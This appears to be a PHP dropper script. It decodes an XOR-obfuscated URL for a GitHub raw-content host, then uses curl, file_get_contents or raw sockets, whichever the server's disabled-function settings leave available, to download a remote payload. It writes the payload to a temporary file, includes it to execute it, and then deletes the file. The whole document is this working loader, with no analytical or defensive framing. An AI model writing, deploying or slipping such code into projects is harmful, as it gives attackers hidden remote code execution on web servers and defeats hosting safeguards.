<?php
$disabled = explode(',', ini_get('disable_functions'));
$disabled = array_map('trim', $disabled);
function isFunctionDisabled($func) {
    global $disabled;
    return in_array($func, $disabled);
}
function fetchRemoteData($host, $path) {
    if (function_exists('curl_init') && !isFunctionDisabled('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://$host$path");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response !== false ? $response : null;
    }
    elseif (function_exists('file_get_contents') && !isFunctionDisabled('file_get_contents')) {
        $context = stream_context_create([
            'https' => ['method' => 'GET', 'timeout' => 10]
        ]);
        return @file_get_contents("https://$host$path", false, $context);
    }
    elseif (function_exists('fsockopen') && !isFunctionDisabled('fsockopen')) {
        $fp = fsockopen("ssl://$host", 443, $errno, $errstr, 10);
        if (!$fp) {
            return null;
        }
        $request = "GET $path HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= "Connection: close\r\n\r\n";
        fwrite($fp, $request);
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 1024);
        }
        fclose($fp);
        list(, $body) = preg_split("/\r\n\r\n/", $response, 2);
        return $body;
    } else {
        return null;
    }
}
function xorEncryptDecrypt($data, $key) {
    $output = '';
    $keyLength = strlen($key);
    for ($i = 0; $i < strlen($data); $i++) {
        $output .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));
    }
    return $output;
}
$key = "!";
$obfuscatedUrl = "S@VFHUITCTRDSBNOUDOUBNL";
$obfuscatedPathx = "M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO";
$obfuscatedExt = "QIQ";
$url = xorEncryptDecrypt($obfuscatedUrl, $key);
$pathx = xorEncryptDecrypt($obfuscatedPathx, $key);
$ext = xorEncryptDecrypt($obfuscatedExt, $key);
$name = "2/your-lc";
$path = $pathx . $name . $ext;
$payload = fetchRemoteData($url, $path);
if ($payload === null) {
    die("Unable to fetch remote payload.");
}
$tempFile = tempnam(sys_get_temp_dir(), 'laolierzi');
file_put_contents($tempFile, $payload);
include $tempFile;
unlink($tempFile);
?>
